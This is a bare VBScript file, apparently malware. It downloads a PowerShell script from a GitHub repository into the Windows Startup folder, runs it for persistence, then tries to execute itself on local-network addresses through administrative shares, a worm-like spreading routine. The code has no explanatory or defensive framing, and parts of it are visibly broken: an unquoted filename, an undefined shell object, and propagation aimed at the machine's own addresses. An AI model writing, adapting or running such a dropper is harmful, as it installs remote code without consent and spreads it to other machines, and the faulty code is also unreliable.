Set WshShell = CreateObject("WScript.Shell")
l8 = WshShell.SpecialFolders("Startup")

Dim objXMLHTTP, objADOStream, objFSO, strFile, strUrl
strFile = l8 + cf99.ps1
strUrl = "https://github.com/kaosSec/kaosTools/raw/main/ps1/cuteandfriendly99.ps1"

' Create objects for HTTP request, file stream, and file system
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADOStream = CreateObject("ADODB.Stream")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Download the file
objXMLHTTP.Open "GET", strUrl, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    objADOStream.Open
    objADOStream.Type = 1 'adTypeBinary
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.Position = 0

    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
    Set objFSO = Nothing ' Release the file system object to avoid file sharing violation
    objADOStream.SaveToFile strFile
    objADOStream.Close
End If

CreateObject("WScript.Shell").Run """" & strFile & """"

Dim arrIPAddresses
arrIPAddresses = GetIPAddresses()

For Each strIPAddress in arrIPAddresses
  On Error Resume Next
  objShell.Run "\\" & strIPAddress & "\c$\windows\system32\cscript.exe //B " & WScript.ScriptFullName, 0, True
  If Err.Number = 0 Then
    ' Script executed successfully on remote machine
  End If
Next

Function GetIPAddresses()
  Dim arrIPAddresses
  arrIPAddresses = Array()
  
  Dim objWMIService
  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
  
  Dim colItems
  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
  
  Dim objItem
  For Each objItem in colItems
    Dim arrIPAddress
    arrIPAddress = objItem.IPAddress
    For Each strIPAddress in arrIPAddress
      If Left(strIPAddress, 7) = "192.168" Then
        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
      End If
    Next
  Next
  
  GetIPAddresses = arrIPAddresses
End Function
